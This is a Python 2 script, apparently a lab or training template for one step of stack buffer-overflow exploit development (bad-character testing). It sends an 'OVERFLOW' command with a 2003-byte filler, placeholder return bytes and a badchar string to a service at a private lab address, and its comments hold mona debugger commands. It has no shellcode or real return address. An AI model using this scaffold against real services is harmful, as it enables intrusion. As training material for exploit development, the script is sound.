#!/usr/bin/python 
import socket 
import time 
import sys

#fourth step : Bad chars
#Update the badchar string and use mona to verify till unmodified 

#mona commands
# !mona config -set workingfolder c:\mona\%p (only once)
# !mona bytearray -b "\x00\x04" (update the bytearray as you get new badchars)
# !mona compare -f C:\mona\bufover\bytearray.bin -a <address> 

try:
	#inputBuffer = "A" * size
	print "Sending evil buffer...\n"

	filler = "A" * 2003 #change the size
	retn = "BBBB"
	offset = "CCCC"
	# --------------------------------- Change the badchar string
	badchars = "\x01\x02.....\xfe\xff"

	buffer = filler + retn + offset + badchars

	inputBuffer = "START OVERFLOW" + buffer + "\r\n"

	print "Sending evil buffer with %s bytes\n" % len(inputBuffer)

	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  	#change ip and port
	s.connect(("192.168.1.10", 9999))
	s.send(inputBuffer)

	s.close()
	print "Done!"

except:
	print "Could not connect!"
	sys.exit()